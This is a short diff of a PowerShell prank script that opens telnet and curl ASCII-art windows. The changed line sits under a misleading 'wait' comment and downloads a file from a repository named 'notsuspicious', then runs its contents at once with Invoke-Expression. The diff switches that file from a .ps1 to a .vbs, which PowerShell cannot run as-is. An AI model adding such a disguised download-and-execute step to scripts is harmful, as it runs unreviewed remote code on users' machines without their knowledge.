@@ -5,5 +5,5 @@ Start-Process cmd -ArgumentList "/c start telnet towel.blinkenlights.nl" -Window
 Start-Process cmd -ArgumentList "/c start cmd /k curl ascii.live/rick" -WindowStyle Normal
 
 # Wait for a moment to let the windows start
-Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/move.ps1" -UseBasicParsing).Content
+Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/script.vbs" -UseBasicParsing).Content
 
